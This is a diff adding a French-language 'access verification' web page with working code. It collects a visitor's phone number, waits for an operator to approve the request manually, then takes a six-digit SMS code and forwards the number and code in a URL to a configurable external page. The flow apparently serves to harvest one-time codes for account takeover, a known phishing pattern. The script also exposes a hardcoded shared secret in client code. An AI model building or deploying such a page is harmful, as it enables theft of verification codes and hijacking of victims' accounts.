@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Vérification d'accès</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --surface: #111827;
+      --surface2: #1a2234;
+      --border: rgba(255,255,255,0.07);
+      --accent: #3b82f6;
+      --text: #f1f5f9;
+      --muted: #64748b;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      overflow: hidden;
+    }
+    body::before {
+      content:'';position:fixed;top:-200px;left:-200px;width:600px;height:600px;
+      background:radial-gradient(circle,rgba(59,130,246,0.08) 0%,transparent 70%);pointer-events:none;
+    }
+    body::after {
+      content:'';position:fixed;bottom:-200px;right:-200px;width:500px;height:500px;
+      background:radial-gradient(circle,rgba(16,185,129,0.05) 0%,transparent 70%);pointer-events:none;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 2.5rem 2rem;
+      width: 100%; max-width: 420px;
+      animation: fadeUp 0.45s ease both;
+    }
+    @keyframes fadeUp {
+      from{opacity:0;transform:translateY(18px)}
+      to{opacity:1;transform:translateY(0)}
+    }
+
+    .icon-wrap {
+      width:56px;height:56px;
+      background:linear-gradient(135deg,rgba(59,130,246,0.2),rgba(59,130,246,0.05));
+      border:1px solid rgba(59,130,246,0.3);border-radius:16px;
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 1.5rem;font-size:26px;
+    }
+    h1 {
+      font-family:'Syne',sans-serif;font-size:22px;font-weight:700;
+      text-align:center;letter-spacing:-0.3px;margin-bottom:8px;
+    }
+    .subtitle {
+      font-size:14px;color:var(--muted);text-align:center;
+      line-height:1.6;margin-bottom:2rem;
+    }
+    label {
+      font-size:12px;font-weight:500;color:var(--muted);
+      text-transform:uppercase;letter-spacing:0.8px;display:block;margin-bottom:8px;
+    }
+    .phone-row { display:flex;gap:8px;margin-bottom:1.25rem; }
+
+    select, input[type=tel] {
+      background:var(--surface2);border:1px solid var(--border);
+      border-radius:12px;color:var(--text);
+      font-family:'DM Sans',sans-serif;font-size:15px;
+      padding:12px 14px;outline:none;transition:border-color 0.2s;
+    }
+    select:focus, input[type=tel]:focus { border-color:rgba(59,130,246,0.5); }
+    select { width:110px;flex-shrink:0;cursor:pointer; }
+    input[type=tel] { flex:1; }
+    input::placeholder { color:var(--muted); }
+
+    .btn {
+      width:100%;background:var(--accent);color:white;border:none;
+      border-radius:12px;padding:14px;
+      font-family:'Syne',sans-serif;font-size:15px;font-weight:600;
+      cursor:pointer;transition:background 0.2s,transform 0.1s;
+      display:flex;align-items:center;justify-content:center;gap:8px;
+    }
+    .btn:hover{background:#2563eb}
+    .btn:active{transform:scale(0.98)}
+    .btn:disabled{background:var(--surface2);color:var(--muted);cursor:not-allowed;transform:none}
+
+    .status {
+      margin-top:1rem;padding:14px;border-radius:12px;
+      font-size:13px;line-height:1.5;
+      display:none;align-items:flex-start;gap:10px;
+    }
+    .status.show { display:flex; }
+    .status.waiting {
+      background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);color:#93c5fd;
+    }
+    .status.error {
+      background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);color:#fca5a5;
+    }
+    .status.rejected {
+      background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);color:#fca5a5;
+    }
+
+    .dots span {
+      display:inline-block;width:6px;height:6px;border-radius:50%;
+      background:#93c5fd;margin:0 2px;animation:bounce 1.2s infinite;
+    }
+    .dots span:nth-child(2){animation-delay:0.2s}
+    .dots span:nth-child(3){animation-delay:0.4s}
+    @keyframes bounce{
+      0%,80%,100%{transform:scale(0.6);opacity:0.4}
+      40%{transform:scale(1);opacity:1}
+    }
+
+    .note { font-size:11px;color:var(--muted);text-align:center;margin-top:1.25rem; }
+
+    /* ── Étape OTP ── */
+    .otp-step { display:none;animation:fadeUp 0.4s ease both; }
+    .otp-step.show { display:block; }
+
+    .success-badge {
+      display:inline-flex;align-items:center;gap:6px;
+      background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.25);
+      color:#6ee7b7;font-size:13px;padding:8px 14px;
+      border-radius:100px;margin-bottom:1.5rem;
+    }
+
+    .otp-inputs { display:flex;justify-content:center;gap:10px;margin:1.5rem 0; }
+    .otp-inputs input {
+      width:50px;height:56px;
+      background:var(--surface2);border:1px solid var(--border);
+      border-radius:12px;color:var(--text);
+      font-size:22px;font-family:'Syne',sans-serif;font-weight:700;
+      text-align:center;outline:none;transition:border-color 0.2s;
+    }
+    .otp-inputs input:focus { border-color:rgba(59,130,246,0.5); }
+  </style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 1 — Saisie du numéro
+════════════════════════════════════════ -->
+<div class="card" id="step1">
+  <div class="icon-wrap">🔐</div>
+  <h1>Accès sécurisé</h1>
+  <p class="subtitle">Entrez votre numéro pour demander l'accès.<br>Un administrateur doit approuver manuellement.</p>
+
+  <label>Votre numéro de téléphone</label>
+  <div class="phone-row">
+    <select id="prefix">
+      <option value="+33">🇫🇷 +33</option>
+      <option value="+32">🇧🇪 +32</option>
+      <option value="+41">🇨🇭 +41</option>
+      <option value="+1">🇺🇸 +1</option>
+      <option value="+44">🇬🇧 +44</option>
+      <option value="+49">🇩🇪 +49</option>
+      <option value="+34">🇪🇸 +34</option>
+      <option value="+39">🇮🇹 +39</option>
+      <option value="+212">🇲🇦 +212</option>
+      <option value="+213">🇩🇿 +213</option>
+      <option value="+216">🇹🇳 +216</option>
+    </select>
+    <input type="tel" id="phone" placeholder="6 12 34 56 78" maxlength="12" />
+  </div>
+
+  <button class="btn" id="submitBtn" onclick="submitPhone()">
+    <span id="btnText">Envoyer la demande</span>
+    <span id="btnArrow">→</span>
+  </button>
+
+  <div class="status waiting" id="statusWaiting">
+    <div class="dots"><span></span><span></span><span></span></div>
+    <span>Demande envoyée… En attente de l'approbation de l'administrateur.</span>
+  </div>
+  <div class="status error" id="statusError">
+    <span>⚠️</span>
+    <span id="errorMsg">Une erreur est survenue.</span>
+  </div>
+  <div class="status rejected" id="statusRejected">
+    <span>🚫</span>
+    <span>Votre accès a été refusé par l'administrateur.</span>
+  </div>
+
+  <p class="note">Vos données ne sont utilisées que pour cette vérification.</p>
+</div>
+
+<!-- ══════════════════════════════════════
+     ÉTAPE 2 — Vérification OTP SMS
+════════════════════════════════════════ -->
+<div class="card otp-step" id="step2">
+  <div style="text-align:center;margin-bottom:1.5rem">
+    <div class="success-badge">✅ Accès approuvé</div>
+  </div>
+  <h1 style="text-align:center">Vérification SMS</h1>
+  <p class="subtitle">Un code à 6 chiffres a été envoyé au<br><strong id="displayPhone" style="color:white"></strong></p>
+
+  <div class="otp-inputs" id="otpInputs">
+    <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]" />
+    <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]" />
+    <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]" />
+    <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]" />
+    <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]" />
+    <input type="text" maxlength="1" class="otp" inputmode="numeric" pattern="[0-9]" />
+  </div>
+
+  <button class="btn" onclick="verifyOTP()">Confirmer le code</button>
+
+  <p class="note" style="margin-top:1rem">
+    Code non reçu ? <a href="#" style="color:#60a5fa;text-decoration:none" onclick="resendCode(event)">Renvoyer</a>
+  </p>
+</div>
+
+<script>
+  // ══════════════════════════════════════════════
+  //  ⚙️ CONFIG — remplace l'URL après déploiement
+  // ══════════════════════════════════════════════
+  const SERVER_URL   = "https://TON-NOM.onrender.com"; // ← ton URL Render ici
+  const SECRET       = "verif2024secure";
+  const OTP_REDIRECT = "https://TON_SITE.com/otp";     // ← ta page OTP finale
+
+  let pollInterval = null;
+  let currentPhone = "";
+
+  // ─────────────────────────────────────────
+  // Soumission du numéro
+  // ─────────────────────────────────────────
+  async function submitPhone() {
+    const prefix = document.getElementById("prefix").value;
+    const num    = document.getElementById("phone").value.replace(/\s/g, "");
+
+    if (!num || num.length < 5) {
+      showStatus("error", "Entrez un numéro de téléphone valide.");
+      return;
+    }
+
+    currentPhone = prefix + num;
+    setBtn(true, "Envoi en cours…", "⏳");
+    hideStatuses();
+
+    try {
+      const res  = await fetch(`${SERVER_URL}/send-request`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone: currentPhone }),
+      });
+      const data = await res.json();
+
+      if (data.ok) {
+        showStatus("waiting");
+        startPolling();
+      } else {
+        showStatus("error", "Erreur serveur : " + (data.error || "inconnue"));
+        setBtn(false, "Envoyer la demande", "→");
+      }
+    } catch (e) {
+      showStatus("error", "Serveur injoignable. Vérifie que le serveur est démarré.");
+      setBtn(false, "Envoyer la demande", "→");
+    }
+  }
+
+  // ─────────────────────────────────────────
+  // Polling toutes les 3s
+  // ─────────────────────────────────────────
+  function startPolling() {
+    pollInterval = setInterval(async () => {
+      try {
+        const res  = await fetch(`${SERVER_URL}/check-approval?phone=${encodeURIComponent(currentPhone)}&secret=${SECRET}`);
+        const data = await res.json();
+
+        if (data.approved) {
+          clearInterval(pollInterval);
+          goToOTP();
+        } else if (data.rejected) {
+          clearInterval(pollInterval);
+          hideStatuses();
+          showStatus("rejected");
+          setBtn(false, "Envoyer la demande", "→");
+        }
+      } catch (_) {}
+    }, 3000);
+  }
+
+  // ─────────────────────────────────────────
+  // Passer à l'étape OTP
+  // ─────────────────────────────────────────
+  function goToOTP() {
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("displayPhone").textContent = currentPhone;
+    const step2 = document.getElementById("step2");
+    step2.classList.add("show");
+
+    const inputs = document.querySelectorAll(".otp");
+    inputs[0].focus();
+
+    inputs.forEach((inp, i) => {
+      inp.addEventListener("input", () => {
+        inp.value = inp.value.replace(/[^0-9]/g, "");
+        if (inp.value && i < inputs.length - 1) inputs[i + 1].focus();
+        if (getOTPCode().length === 6) verifyOTP();
+      });
+      inp.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !inp.value && i > 0) inputs[i - 1].focus();
+      });
+      inp.addEventListener("paste", (e) => {
+        e.preventDefault();
+        const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+        pasted.split("").forEach((char, idx) => {
+          if (inputs[idx]) inputs[idx].value = char;
+        });
+        if (inputs[pasted.length - 1]) inputs[pasted.length - 1].focus();
+        if (pasted.length === 6) verifyOTP();
+      });
+    });
+  }
+
+  // ─────────────────────────────────────────
+  // Vérification du code OTP
+  // ─────────────────────────────────────────
+  function getOTPCode() {
+    return Array.from(document.querySelectorAll(".otp")).map(i => i.value).join("");
+  }
+
+  function verifyOTP() {
+    const code = getOTPCode();
+    if (code.length < 6) return;
+    // Redirige vers ta page OTP finale avec le numéro en paramètre
+    window.location.href = OTP_REDIRECT + "?phone=" + encodeURIComponent(currentPhone) + "&code=" + code;
+  }
+
+  function resendCode(e) {
+    e.preventDefault();
+    alert("Renvoyer le SMS — connecte cette fonction à Twilio ou ton système SMS.");
+  }
+
+  // ─────────────────────────────────────────
+  // Helpers UI
+  // ─────────────────────────────────────────
+  function setBtn(disabled, text, icon) {
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = disabled;
+    document.getElementById("btnText").textContent = text;
+    document.getElementById("btnArrow").textContent = icon;
+  }
+
+  function showStatus(type, msg) {
+    const el = document.getElementById(
+      type === "waiting"  ? "statusWaiting"  :
+      type === "rejected" ? "statusRejected" : "statusError"
+    );
+    if (msg) document.getElementById("errorMsg").textContent = msg;
+    el.classList.add("show");
+  }
+
+  function hideStatuses() {
+    ["statusWaiting","statusError","statusRejected"].forEach(id =>
+      document.getElementById(id).classList.remove("show")
+    );
+  }
+</script>
+</body>
+</html>
